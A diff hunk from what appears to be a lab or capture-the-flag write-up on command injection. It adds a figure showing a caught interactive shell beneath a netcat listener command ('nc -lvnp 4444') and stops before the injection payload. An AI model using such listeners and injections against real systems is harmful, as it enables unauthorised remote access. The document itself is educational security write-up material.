@@ -55,6 +55,11 @@ By appending an operator payload, the system command syntax was hijacked.
    ```bash
    nc -lvnp 4444
    ```
+   <!-- 🖼️ PLACE FOURTH IMAGE HERE -->
+![Initial Access Foothold](images/foothold_lvl2.png)
+*Figure 4: Successfully catching the interactive shell session using a Netcat listener.*
+
+---
 
 2. The following unified logical payload was delivered through the command field entry parameter:
    ```text
